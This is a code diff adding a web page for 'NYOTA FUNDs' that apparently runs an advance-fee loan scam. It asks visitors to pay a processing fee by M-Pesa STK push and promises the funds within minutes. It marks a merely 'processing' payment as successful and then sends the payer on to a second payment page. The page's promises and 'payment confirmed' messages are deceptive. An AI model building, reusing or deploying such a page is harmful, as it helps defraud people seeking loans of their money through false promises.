@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="en">
+  <!-- Brevo Conversations {literal} -->
+<script>
+    (function(d, w, c) {
+        w.BrevoConversationsID = '6973a340153840fff105d60b';
+        w[c] = w[c] || function() {
+            (w[c].q = w[c].q || []).push(arguments);
+        };
+        var s = d.createElement('script');
+        s.async = true;
+        s.src = 'https://conversations-widget.brevo.com/brevo-conversations.js';
+        if (d.head) d.head.appendChild(s);
+    })(document, window, 'BrevoConversations');
+</script>
+<!-- /Brevo Conversations {/literal} -->
+<head>
+  <!-- Brevo Conversations {literal} -->
+<script>
+    (function(d, w, c) {
+        w.BrevoConversationsID = '6973a340153840fff105d60b';
+        w[c] = w[c] || function() {
+            (w[c].q = w[c].q || []).push(arguments);
+        };
+        var s = d.createElement('script');
+        s.async = true;
+        s.src = 'https://conversations-widget.brevo.com/brevo-conversations.js';
+        if (d.head) d.head.appendChild(s);
+    })(document, window, 'BrevoConversations');
+</script>
+<!-- /Brevo Conversations {/literal} -->
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Payment 1 – Processing Fee</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<div class="container">
+    <h2>NYOTA FUNDs Processing Fee Payment here</h2>
+    <p style="font-size:18px;">
+        Hi 👋<span id="username"></span>! To receive your NYOTA FUND, please pay the processing fee below. <br>
+        <strong>Once paid, your funds will be delivered in a few minutes!</strong>
+    </p>
+
+    <p style="font-size:20px; font-weight:bold; color:#0a6ebd;">
+        Processing Fee: Ksh <span id="feeAmount">---</span>
+    </p>
+
+    <form id="payForm">
+        <input type="text" id="senderName" placeholder="Enter Your Full Name" required>
+        <input type="text" id="senderPhone" placeholder="Enter Your Phone Number" required>
+        <button type="submit" id="payBtn">Pay Now</button>
+         <button type="button" id="retryBtn" style="display:none;margin-top:10px;">
+    Retry Payment
+</button>
+    </form>
+
+    <p style="margin-top:15px; font-size:14px; color:gray;">
+        Please wait a few minutes for your payment to be processed. You will be automatically redirected to the next step after your payment is confirmed. You can also contact admin via live chat for support.
+    </p>
+
+    
+
+ <script>
+ // ===== LOAD USER NAME FROM LOCAL STORAGE =====
+  const users = JSON.parse(localStorage.getItem("nyota_users") || "[]");
+  const phone = localStorage.getItem("userPhone");
+
+  const currentUser = users.find(u => u.phone === phone);
+
+  if (currentUser && currentUser.fullname) {
+    document.getElementById("username").textContent =
+  " " + currentUser.fullname.toUpperCase();
+  }
+
+   let paymentWasSuccessful = false;
+   let lastReceiptStatus = null;
+   let redirectTimer = null;
+   let redirectCountdownInterval = null;
+   const REDIRECT_DELAY_MS = 5 * 1000; // 5 seconds
+   let redirectSecondsLeft = Math.floor(REDIRECT_DELAY_MS / 1000);
+
+// ================== LOAD FEE ==================
+const fund = JSON.parse(localStorage.getItem("selectedFund"));
+
+if (!fund || !fund.fee) {
+    alert("Please select an amount first.");
+    window.location.href = "amount.html";
+}
+
+document.getElementById("feeAmount").innerText = fund.fee;
+
+// ================== HELPERS ==================
+function formatPhone(phone) {
+    const digits = phone.replace(/\D/g, "");
+    if (digits.length === 9 && digits.startsWith("7")) return "254" + digits;
+    if (digits.length === 10 && digits.startsWith("07")) return "254" + digits.substring(1);
+    if (digits.length === 12 && digits.startsWith("254")) return digits;
+    return null;
+}
+
+function showBadge(text, color) {
+    let badge = document.getElementById("statusBadge");
+    if (!badge) {
+        badge = document.createElement("div");
+        badge.id = "statusBadge";
+        badge.style.marginTop = "10px";
+        badge.style.fontSize = "14px";
+        document.querySelector(".container").appendChild(badge);
+    }
+    badge.innerHTML = `<strong style="color:${color}">${text}</strong>`;
+}
+
+ function showPopup(title, message) {
+    document.getElementById("popupTitle").innerText = title;
+    document.getElementById("popupMessage").innerHTML = message;
+    document.getElementById("popupOverlay").style.display = "block";
+}
+
+function closePopup() {
+    // clear countdown UI and timers (if any) then hide popup
+    clearRedirectTimers();
+    document.getElementById("popupOverlay").style.display = "none";
+}
+
+function popupOk() {
+    // If the last polled receipt status is processing, redirect immediately to payment2.html
+    if (lastReceiptStatus === "processing") {
+        // cleanup and redirect
+        clearRedirectTimers();
+        localStorage.removeItem("paymentReference");
+        window.location.href = "payment2.html";
+    } else {
+        // for failed/cancelled/error just close
+        closePopup();
+    }
+}
+
+function clearRedirectTimers() {
+    if (redirectTimer) {
+        clearTimeout(redirectTimer);
+        redirectTimer = null;
+    }
+    if (redirectCountdownInterval) {
+        clearInterval(redirectCountdownInterval);
+        redirectCountdownInterval = null;
+    }
+    redirectSecondsLeft = Math.floor(REDIRECT_DELAY_MS / 1000);
+}
+
+// ================== FORM SUBMIT ==================
+const form = document.getElementById("payForm");
+const button = document.getElementById("payBtn");
+ const retryBtn = document.getElementById("retryBtn");
+
+retryBtn.onclick = () => {
+    retryBtn.style.display = "none";
+    document.getElementById("payBtn").click();
+};
+
+form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+
+    const name = document.getElementById("senderName").value.trim();
+    const rawPhone = document.getElementById("senderPhone").value.trim();
+    const phone = formatPhone(rawPhone);
+    const amount = Number(fund.fee);
+
+    if (name.length < 2) {
+        alert("Enter your full name");
+        return;
+    }
+
+    if (!phone) {
+        alert("Enter a valid Safaricom number (07XXXXXXXX)");
+        return;
+    }
+
+    button.disabled = true;
+    button.innerText = "⏳ Sending STK Push...";
+
+    try {
+        const res = await fetch("https://loanserver-a9tc.onrender.com/pay", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                phone: phone,
+                amount: amount,
+                loan_amount: fund.amount || "50000"
+            })
+        });
+
+        const data = await res.json();
+
+       if (data.success) {
+    retryBtn.style.display = "none";
+
+    showBadge("🟡 STK sent. Enter your M-Pesa PIN", "orange");
+
+    button.disabled = false;
+    button.innerText = "Pay Now";
+
+    localStorage.setItem("paymentReference", data.reference);
+
+    pollReceipt(data.reference);
+}  else {
+    alert(data.error || "Payment failed");
+    showBadge("🔴 STK push failed. Please retry.", "red");
+    button.disabled = false;
+    button.innerText = "Pay Now";
+   retryBtn.style.display = "block";
+}
+
+    } catch (err) {
+        alert("Server connection failed. Try again.");
+        button.disabled = false;
+        button.innerText = "Pay Now";
+        retryBtn.style.display = "block";
+        console.error(err);
+    }
+});
+
+// ================== RECEIPT POLLING ==================
+function pollReceipt(reference) {
+    let attempts = 0;
+   retryBtn.style.display = "none";
+
+    const interval = setInterval(async () => {
+        attempts++;
+
+        try {
+            const res = await fetch(`https://loanserver-a9tc.onrender.com/receipt/${reference}`);
+            if (!res.ok) return;
+
+            const data = await res.json();
+            const r = data.receipt;
+
+            if (r.status !== "pending") {
+                clearInterval(interval);
+                localStorage.removeItem("paymentReference");
+
+                // track last status
+                lastReceiptStatus = r.status;
+
+                if (r.status === "processing") {
+                    localStorage.setItem("payment1Completed", "yes");
+                    // Treat "processing" as success: show success badge and start redirect countdown
+                    showBadge("✅ Payment successful. Loan processing…", "green");
+
+                    // Show popup and include redirect notice and countdown
+                    updateProcessingPopup(r);
+
+                    // schedule redirect in 3 minutes
+                    clearRedirectTimers();
+                    redirectTimer = setTimeout(() => {
+                        localStorage.removeItem("paymentReference");
+                        window.location.href = "payment2.html";
+                    }, REDIRECT_DELAY_MS);
+
+                    // start per-second countdown display
+                    redirectSecondsLeft = Math.floor(REDIRECT_DELAY_MS / 1000);
+                    redirectCountdownInterval = setInterval(() => {
+                        redirectSecondsLeft -= 1;
+                        updateProcessingPopup(r); // refresh message
+                        if (redirectSecondsLeft <= 0) {
+                            clearRedirectTimers();
+                        }
+                    }, 1000);
+
+                } else if (r.status === "cancelled" || r.status === "stk_failed" || r.status === "error") {
+                    // Failed or cancelled: show failed badge, show popup but NO redirect
+                    showBadge("🔴 Payment failed or cancelled. Please retry.", "red");
+
+                    showPopup(
+                        "Payment Receipt",
+                        "Reference: " + r.reference + "<br>" +
+                        "Status: " + r.status.toUpperCase() + "<br>" +
+                        "Amount: KES " + r.amount + "<br><br>" +
+                        (r.status_note ? ("Note: " + r.status_note) : "")
+                    );
+
+                } else {
+                    // Any other statuses: show popup but no redirect by default
+                    showPopup(
+                        "Payment Receipt",
+                        "Reference: " + r.reference + "<br>" +
+                        "Status: " + r.status.toUpperCase() + "<br>" +
+                        "Amount: KES " + r.amount + "<br><br>" +
+                        (r.status_note ? ("Note: " + r.status_note) : "")
+                    );
+                }
+            }
+        } catch (e) {
+            console.error(e);
+        }
+
+        if (attempts > 12) clearInterval(interval);
+    }, 5000);
+}
+
+function updateProcessingPopup(receipt) {
+    // Build the popup message with dynamic countdown
+    let countdownText = "";
+    if (redirectSecondsLeft > 0) {
+        const mins = Math.floor(redirectSecondsLeft / 60);
+        const secs = redirectSecondsLeft % 60;
+        countdownText = `<br><strong>You will be redirected in ${mins}:${secs
+            .toString()
+            .padStart(2, "0")} (mm:ss).</strong>`;
+    } else {
+        countdownText = `<br><strong>Redirecting now…</strong>`;
+    }
+
+    const msg =
+        "Reference: <strong>" + receipt.reference + "</strong><br>" +
+        "Status: <strong>PAYMENT SUCCESSFUL</strong><br>" +
+        "Amount Paid: <strong>KES " + receipt.amount + "</strong><br><br>" +
+
+        "✅ <strong>Thank you for choosing NYOTA FUNDS!</strong><br>" +
+        "We have successfully received and verified your processing fee.<br><br>" +
+
+        "💼 <strong>Your funds are now being prepared.</strong><br>" +
+        "To complete the process, you will now choose where you would like to receive your money " +
+        "(M-Pesa,Airtelmoney or Bank account).<br><br>" +
+
+        "⏳ <strong>This will only take a few seconds.</strong>" +
+        countdownText +
+
+        "<br><br><em>You may tap OK to continue immediately.</em>";
+
+    showPopup("NYOTA FUNDs – Payment Confirmed", msg);
+}
+
+// If a payment was previously initiated, resume polling
+ const savedRef = localStorage.getItem("paymentReference");
+if (savedRef) {
+    pollReceipt(savedRef);
+}
+</script>
+
+<style>
+.chat-btn {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    background:#0a6ebd;
+    color:#fff;
+    padding:12px 16px;
+    border-radius:50px;
+    text-decoration:none;
+    font-size:16px;
+    box-shadow:0 4px 8px rgba(0,0,0,0.2);
+    animation: bounce 2s infinite;
+}
+@keyframes bounce {
+    0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
+    40% { transform: translateY(-8px); }
+    60% { transform: translateY(-4px); }
+}
+</style>
+ <!-- ===== PAYMENT POPUP ===== -->
+<div id="popupOverlay" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.6); z-index:999;">
+  <div style="background:#fff; max-width:320px; margin:30% auto; padding:20px; border-radius:12px; text-align:center;">
+    <h3 id="popupTitle">Payment Update</h3>
+    <p id="popupMessage" style="font-size:14px; line-height:1.5;"></p>
+    <button onclick="popupOk()" style="margin-top:12px; padding:10px 18px; border:none; background:#0a6ebd; color:#fff; border-radius:6px;">
+      OK
+    </button>
+  </div>
+</div>
+</body>
+</html>
